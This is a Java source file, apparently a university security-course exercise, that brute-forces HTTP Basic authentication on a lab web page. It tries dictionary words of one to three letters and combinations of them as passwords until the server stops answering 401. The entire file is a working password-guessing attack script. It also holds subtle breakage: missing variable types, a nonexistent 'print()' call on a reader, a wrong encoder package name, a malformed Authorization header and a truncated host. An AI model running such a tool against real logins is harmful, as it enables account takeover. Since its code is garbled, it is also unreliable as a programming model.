




import java.io.IOException;
import java.net.*;

import java.io.*;
import java.util.*;



public class Dictionary

{


   static URL url = null;
   static URLConnection urlConnection;
   static InputStream urlStream;

   static String strOneLetterWords[];
   static String strTwoLetterWords[];
   static String strThreeLetterWords[];

   static String strExceptionPassword[];

   static String strLastPasswordTested;
   static String username = "";

   static int intNumberOfOneLetterWords   = 0;
   static int intNumberOfTwoLetterWords   = 0;
   static int intNumberOfThreeLetterWords = 0;

   static int intExceptionCount = -1;

   static int intNumberOfConnectionAttempts = 0;
   static int intTotalNumberOfWordsInFile = 0;




   public static void main (String args[])
   
   {


         
         
      Calendar calStart;
      Calendar calFinish;   
      Date dateStart;
      Date dateFinish;
       lngStart;
       lngFinish;



      String strLine;
      String strTextFileName = "/usr/share/lib/dict/words";

      boolean boolPasswordFound = false;
      boolean boolExceptionPasswordsTestedAgain = false;




      String urlString
            = "http://sec-crack.cs.rmit.edu./SEC/2/index.php";

      int intCounter1;
      int intCounter2;
      int intCounter3;

      int intTotalNumberOfWordsChecked = 0;



         
         
      calStart  = new GregorianCalendar();
      dateStart = calStart.getTime();
      lngStart  = dateStart.getTime();          



         
         
         
         
         
      strExceptionPassword = new String[5000];


         
         
      getNumberOfVariousLengthsOfWords(strTextFileName);


         
         
      strOneLetterWords   = new String[intNumberOfOneLetterWords];
      strTwoLetterWords   = new String[intNumberOfTwoLetterWords];
      strThreeLetterWords = new String[intNumberOfThreeLetterWords];


         
         
      populateTheDifferentLengthArrays(strTextFileName);




      if (!boolPasswordFound) 
      {


            
            

         intCounter1 = 0;

         while ( (!boolPasswordFound) && (intCounter1 < intNumberOfOneLetterWords) )
         {

            boolPasswordFound = true;

            boolPasswordFound = passwordWasFound(urlString,
                                                 strOneLetterWords[intCounter1],
                                                 boolPasswordFound);

            intCounter1++;

            intTotalNumberOfWordsChecked++;

         }



            
            

         intCounter1 = 0;

         while ( (!boolPasswordFound) && (intCounter1 < intNumberOfTwoLetterWords) )
         {

            boolPasswordFound = true;

            boolPasswordFound = passwordWasFound(urlString,
                                                 strTwoLetterWords[intCounter1],
                                                 boolPasswordFound);

            intCounter1++;

            intTotalNumberOfWordsChecked++;

         }



            
            

         intCounter1 = 0;

         while ( (!boolPasswordFound) && (intCounter1 < intNumberOfThreeLetterWords) )
         {

            boolPasswordFound = true;

            boolPasswordFound = passwordWasFound(urlString,
                                                 strThreeLetterWords[intCounter1],
                                                 boolPasswordFound);

            intCounter1++;

            intTotalNumberOfWordsChecked++;

         }



            
            
            

         intCounter1 = 0;

         while ( (!boolPasswordFound) && (intCounter1 < intNumberOfOneLetterWords) )
         {

            intCounter2 = 0; 

            while ( (!boolPasswordFound) && (intCounter2 < intNumberOfOneLetterWords) )
            {

               boolPasswordFound = true;

               boolPasswordFound 
                   = passwordWasFound(urlString,
                                      strOneLetterWords[intCounter1] + 
                                              strOneLetterWords[intCounter2],
                                      boolPasswordFound);  

               intCounter2++;

               intTotalNumberOfWordsChecked++;

            }


            intCounter1++;

         }



            
            
            
            
            

         intCounter1 = 0;

         while ( (!boolPasswordFound) && (intCounter1 < intNumberOfOneLetterWords) )
         {

            intCounter2 = 0; 

            while ( (!boolPasswordFound) && (intCounter2 < intNumberOfOneLetterWords) )
            {

               intCounter3 = 0; 

               while ( (!boolPasswordFound) && (intCounter3 < intNumberOfOneLetterWords) )
               {

                  boolPasswordFound = true;

                  boolPasswordFound 
                      = passwordWasFound(urlString,
                                         strOneLetterWords[intCounter1]         + 
                                                 strOneLetterWords[intCounter2] +
                                                 strOneLetterWords[intCounter3],
                                         boolPasswordFound);  

                  intCounter3++;

                  intTotalNumberOfWordsChecked++;

               }


               intCounter2++;

            }


            intCounter1++;

         }



            
            
            

         intCounter1 = 0;

         while ( (!boolPasswordFound) && (intCounter1 < intNumberOfOneLetterWords) )
         {

            intCounter2 = 0; 

            while ( (!boolPasswordFound) && (intCounter2 < intNumberOfTwoLetterWords) )
            {

               boolPasswordFound = true;

               boolPasswordFound 
                   = passwordWasFound(urlString,
                                      strOneLetterWords[intCounter1] + 
                                              strTwoLetterWords[intCounter2],
                                      boolPasswordFound);  

               intCounter2++;

               intTotalNumberOfWordsChecked++;

            }


            intCounter1++;

         }



            
            
            

         intCounter1 = 0;

         while ( (!boolPasswordFound) && (intCounter1 < intNumberOfTwoLetterWords) )
         {

            intCounter2 = 0; 

            while ( (!boolPasswordFound) && (intCounter2 < intNumberOfOneLetterWords) )
            {

               boolPasswordFound = true;

               boolPasswordFound 
                   = passwordWasFound(urlString,
                                      strTwoLetterWords[intCounter1] + 
                                              strOneLetterWords[intCounter2],
                                      boolPasswordFound);  

               intCounter2++;

               intTotalNumberOfWordsChecked++;

            }


            intCounter1++;

         }



            
            
            
            
            

         intCounter1 = 0;

         while ( (!boolPasswordFound) && (intCounter1 <= intExceptionCount) )
         {

            boolExceptionPasswordsTestedAgain = true;
            boolPasswordFound = true;

            boolPasswordFound 
                = passwordWasFound(urlString,
                                   strExceptionPassword[intCounter1],
                                   boolPasswordFound);  

            intCounter1++;

            intTotalNumberOfWordsChecked++;

         }

      }   



         
         
      calFinish  = new GregorianCalendar();
      dateFinish = calFinish.getTime();
      lngFinish  = dateFinish.getTime();      


         
         
      System.out.println();
      System.out.println();


      System.out.println();
      System.out.println("Length of time for processing: " + 
                         ((lngFinish - lngStart) / 1000)   + 
                         " seconds");


      System.out.println();
      System.out.println("Total number of words in dictionary file = " + intTotalNumberOfWordsInFile);


      System.out.println();
      System.out.println("Input file:  number of words with one letter length   = " + intNumberOfOneLetterWords);
      System.out.println("Input file:  number of words with two letter length   = " + intNumberOfTwoLetterWords);
      System.out.println("Input file:  number of words with three letter length = " + intNumberOfThreeLetterWords);


      System.out.println();
      System.out.println("Number of connection attempts = " + intTotalNumberOfWordsChecked);


      System.out.println();
      System.out.println("Number of exceptions thrown = " + (intExceptionCount + 1));
      System.out.println();


      if (intExceptionCount >= 0)
      {
         System.out.print("These passwords WERE ");

         if (boolExceptionPasswordsTestedAgain)
            System.out.print("tested again.");
         else
            System.out.print("NOT tested again.");

         System.out.println();
      }


      if (boolPasswordFound) 
      {
         System.out.println("The correct password WAS found - this password is '" + 
                            strLastPasswordTested + "'.");
      } 
      else
      {
         System.out.println("The correct password WAS NOT found.");
      } 
            
      System.out.println();

   }







   static void getNumberOfVariousLengthsOfWords(String TextFileName)
   
   {

      FileReader reader;
      BufferedReader inTextFile = null;

      String strLine;
      int intWordLength;



      try
      {      
 
            
            
            
            
         reader = new FileReader(TextFileName);

            
            
            
            
         inTextFile = new BufferedReader(reader);


         strLine = inTextFile.readLine();


         while (strLine != null)
         {

            intTotalNumberOfWordsInFile++;

            strLine = strLine.trim();

            intWordLength = strLine.length();


               
               
            if (intWordLength == 1)
               intNumberOfOneLetterWords++;

               
               
            else if (intWordLength == 2) 
               intNumberOfTwoLetterWords++;

               
               
            else if (intWordLength == 3)
               intNumberOfThreeLetterWords++;


            strLine = inTextFile.readLine();

         }

      }

      catch(FileNotFoundException e)
      {

            
            
         System.out.println();
         System.out.println("The file '" + TextFileName + "' cannot  found.");
         System.out.println();

      }

      catch(Exception e)
      {

      }

      finally
      {

         try
         {
            inTextFile.print();
         }
         catch(Exception e)
         {
         }

         inTextFile = null;
         reader = null;

      }

   }      






   static void populateTheDifferentLengthArrays(String TextFileName)
   
   {

      FileReader reader;
      BufferedReader inTextFile = null;

      String strLine;
      int intWordLength;

      int intCountOfOneLetterWords   = -1;
      int intCountOfTwoLetterWords   = -1;
      int intCountOfThreeLetterWords = -1;



      try
      {      
 
            
            
            
            
         reader = new FileReader(TextFileName);

            
            
            
            
         inTextFile = new BufferedReader(reader);


         strLine = inTextFile.readLine();


         while (strLine != null)
         {

            strLine = strLine.trim();
            intWordLength = strLine.length();


               
               
            if (intWordLength == 1)
            {
               intCountOfOneLetterWords++;
               strOneLetterWords[intCountOfOneLetterWords] = strLine;
            }

               
               
            else if (intWordLength == 2) 
            {

               intCountOfTwoLetterWords++;
               strTwoLetterWords[intCountOfTwoLetterWords] = strLine;
            }

               
               
            else if (intWordLength == 3)
            {
               intCountOfThreeLetterWords++;
               strThreeLetterWords[intCountOfThreeLetterWords] = strLine;
            }

            strLine = inTextFile.readLine();

         }

      }

      catch(FileNotFoundException e)
      {

            
            
         System.out.println();
         System.out.println("The file '" + TextFileName + "' cannot  found.");
         System.out.println();

      }

      catch(Exception e)
      {
         System.out.println("Exception thrown....");
         System.err.println(e);
      }

      finally
      {

         try
         {
            inTextFile.print();
         }
         catch(Exception e)
         {
         }

         inTextFile = null;
         reader = null;

      }

   }







   static boolean passwordWasFound(String urlString,
                                   String password,
                                   boolean retVal)
   
   {

      String strEncodeInput = username + ":" + password;
      boolean returnValue = retVal;
      boolean boolExceptionThrown = false;



      try
      {

         strLastPasswordTested = password;
 
         intNumberOfConnectionAttempts++;

         url = new URL(urlString);

         String encoding = new url.misc.BASE64Encoder().encode (strEncodeInput.getBytes());


         System.out.print("username = " + 
                          username      + 
                          "    "       +
                          "password = " +
                          password);



         HttpURLConnection urlConnection = (HttpURLConnection)url.openConnection();

         urlConnection.setRequestProperty("Authorization", 
                                          " " + encoding);   

         System.out.println("    response  = " + urlConnection.getResponseCode());

         if (urlConnection.getResponseCode() == 401)
         {
            returnValue = false;         
         }

      }

      catch (MalformedURLException m)
      {
         boolExceptionThrown = true;
         returnValue = false;

         System.err.println(m);
         System.out.println("Malformed URL Exception error");
      }

      catch (IOException io)
      {
         boolExceptionThrown = true;
         returnValue = false;

         System.out.println("IOException error");
         System.err.println(io); 
      }

      catch (Exception e)
      {
         boolExceptionThrown = true;
         returnValue = false;

         System.out.println("General exception.....");
         System.err.println(e); 
      }

      finally
      { 
         urlConnection = null;
         url = null; 
      }


      if (boolExceptionThrown)
      {
         intExceptionCount++;
         strExceptionPassword[intExceptionCount] = password;
      }


      return returnValue;

   }

}